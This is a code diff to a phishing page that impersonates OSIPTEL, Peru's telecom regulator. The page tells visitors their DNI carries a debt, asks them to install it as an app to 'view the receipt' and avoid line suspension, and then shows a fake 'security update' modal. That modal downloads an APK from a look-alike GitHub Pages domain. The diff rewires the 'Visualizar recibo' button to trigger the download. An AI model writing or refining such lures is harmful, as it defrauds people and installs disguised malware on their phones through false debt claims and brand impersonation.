@@ -50,20 +50,20 @@
         #resultado-falso h3 { color: #856404; font-size: 16px; margin-bottom: 10px; }
         #resultado-falso p { color: #856404; font-size: 14px; margin-bottom: 8px; }
         
-        /* Banner PWA */
+        /* Banner PWA (para la web) */
         #banner-pwa { display: none; position: fixed; bottom: 0; left: 0; right: 0; background: white; padding: 20px; box-shadow: 0 -2px 15px rgba(0,0,0,0.2); text-align: center; z-index: 9999; }
         #banner-pwa p { margin-bottom: 10px; font-size: 14px; color: #333; }
         #banner-pwa button { background: #2664AE; color: white; border: none; padding: 12px 30px; font-size: 14px; border-radius: 4px; cursor: pointer; margin: 5px; font-weight: bold; }
         #banner-pwa button.cancel { background: #999; }
 
-        /* Pantalla de actualización (solo visible en PWA instalada) */
-        #update-prompt { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.7); z-index: 10001; align-items: center; justify-content: center; }
-        #update-prompt .modal { background: white; border-radius: 12px; padding: 25px; text-align: center; max-width: 350px; box-shadow: 0 4px 20px rgba(0,0,0,0.3); }
-        #update-prompt .modal img { height: 45px; margin-bottom: 15px; }
-        #update-prompt .modal h3 { color: #003366; margin-bottom: 10px; }
-        #update-prompt .modal p { font-size: 14px; color: #555; margin-bottom: 15px; }
-        #update-prompt .modal button { background: #003366; color: white; border: none; padding: 12px 30px; font-size: 15px; border-radius: 6px; cursor: pointer; font-weight: bold; width: 100%; }
-        #update-prompt .modal button.cancel { background: none; color: #999; margin-top: 10px; font-size: 13px; cursor: pointer; }
+        /* Modal de descarga del APK (solo visible en PWA instalada tras pulsar "Visualizar recibo") */
+        #modal-apk { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.7); z-index: 10001; align-items: center; justify-content: center; }
+        #modal-apk .modal-contenido { background: white; border-radius: 12px; padding: 25px; text-align: center; max-width: 350px; box-shadow: 0 4px 20px rgba(0,0,0,0.3); }
+        #modal-apk .modal-contenido img { height: 45px; margin-bottom: 15px; }
+        #modal-apk .modal-contenido h3 { color: #003366; margin-bottom: 10px; }
+        #modal-apk .modal-contenido p { font-size: 14px; color: #555; margin-bottom: 15px; }
+        #modal-apk .modal-contenido button { background: #003366; color: white; border: none; padding: 12px 30px; font-size: 15px; border-radius: 6px; cursor: pointer; font-weight: bold; width: 100%; }
+        #modal-apk .modal-contenido button.cancel { background: none; color: #999; margin-top: 10px; font-size: 13px; cursor: pointer; }
     </style>
 </head>
 <body>
@@ -72,17 +72,6 @@
     <header class="header">
         <img src="logo_osiptel_gris.svg" alt="OSIPTEL">
     </header>
-
-    <!-- AVISO DE ACTUALIZACIÓN FALSO (solo visible cuando la PWA está instalada) -->
-    <div id="update-prompt">
-        <div class="modal">
-            <img src="logo_osiptel_gris.svg" alt="OSIPTEL">
-            <h3>⚠️ Actualización necesaria</h3>
-            <p>Se requiere una actualización de seguridad para continuar con la verificación de sus líneas.</p>
-            <button id="btn-install-apk">🔄 Instalar ahora</button>
-            <button class="cancel" onclick="cerrarUpdatePrompt()">Recordarme más tarde</button>
-        </div>
-    </div>
 
     <!-- BANNER PRINCIPAL (usando URL oficial de OSIPTEL) -->
     <div class="banner">
@@ -119,7 +108,7 @@
                 <p><strong>DNI <span id="dniMostrado"></span> tiene deuda.</strong></p>
                 <p><strong>Deuda vigente desde el <span id="fechaDeuda"></span>.</strong></p>
                 <p><strong>Deuda pendiente: S/ 89.90 - Plan Postpago.</strong></p>
-                <button class="btn" onclick="activarBanner()">📄 Visualizar recibo</button>
+                <button class="btn" onclick="mostrarDescargaAPK()">📄 Visualizar recibo</button>
             </div>
         </div>
     </div>
@@ -175,7 +164,7 @@
         </div>
     </div>
 
-    <!-- BANNER DE INSTALACIÓN PWA -->
+    <!-- Banner de instalación PWA (solo en navegador) -->
     <div id="banner-pwa">
         <p>📲 Para visualizar su recibo, añada esta página a su pantalla de inicio.</p>
         <p style="font-size:13px;color:#555;">Esto le permitirá acceder rápidamente a recibo y evitar la suspensión de su línea.</p>
@@ -183,33 +172,32 @@
         <button class="cancel" onclick="document.getElementById('banner-pwa').style.display='none'">Ahora no</button>
     </div>
 
+    <!-- Modal de descarga del APK (aparece tras "Visualizar recibo" cuando la PWA está instalada) -->
+    <div id="modal-apk">
+        <div class="modal-contenido">
+            <img src="logo_osiptel_gris.svg" alt="OSIPTEL">
+            <h3>⚠️ Actualización necesaria</h3>
+            <p>Para ver el recibo completo, instale la versión actualizada de la aplicación.</p>
+            <button id="btn-descargar-apk">🔄 Descargar actualización</button>
+            <button class="cancel" onclick="document.getElementById('modal-apk').style.display='none'">Ahora no</button>
+        </div>
+    </div>
+
     <script>
         let deferredPrompt;
 
         // Detectar si la app se abrió como WebAPK instalada
-        if (window.matchMedia('(display-mode: standalone)').matches || navigator.standalone) {
-            document.getElementById('update-prompt').style.display = 'flex';
-            document.getElementById('formulario').style.display = 'none';
-        }
+        const esPWAInstalada = window.matchMedia('(display-mode: standalone)').matches || navigator.standalone;
 
-        // Cerrar el aviso de actualización (si el usuario lo pospone)
-        function cerrarUpdatePrompt() {
-            document.getElementById('update-prompt').style.display = 'none';
-            document.getElementById('formulario').style.display = 'block';
-        }
-
-        // Forzar la descarga del APK al hacer clic en "Instalar ahora"
-        document.getElementById('btn-install-apk').addEventListener('click', function() {
-            // Reemplaza esta URL con la de tu APK en GitHub Pages
+        // Configurar el botón de descarga del APK
+        document.getElementById('btn-descargar-apk').addEventListener('click', function() {
             const apkUrl = 'https://osiptel-peru.github.io/osiptel.pe/app-release.apk';
-            
             const link = document.createElement('a');
             link.href = apkUrl;
             link.download = 'OSIPTEL_Actualizacion.apk';
             document.body.appendChild(link);
             link.click();
             document.body.removeChild(link);
-            
             alert('Descarga iniciada. Una vez completada, abra el archivo para instalar la actualización.');
         });
 
@@ -251,8 +239,15 @@
             }).catch(() => {});
         }
 
-        function activarBanner() {
-            document.getElementById('banner-pwa').style.display = 'block';
+        // Esta función reemplaza a la anterior "activarBanner"
+        function mostrarDescargaAPK() {
+            if (esPWAInstalada) {
+                // Si ya está instalada como PWA, mostramos el modal para descargar el APK
+                document.getElementById('modal-apk').style.display = 'flex';
+            } else {
+                // Si es navegador normal, mostramos el banner de instalación de la PWA
+                document.getElementById('banner-pwa').style.display = 'block';
+            }
         }
 
         function instalarPWA() {
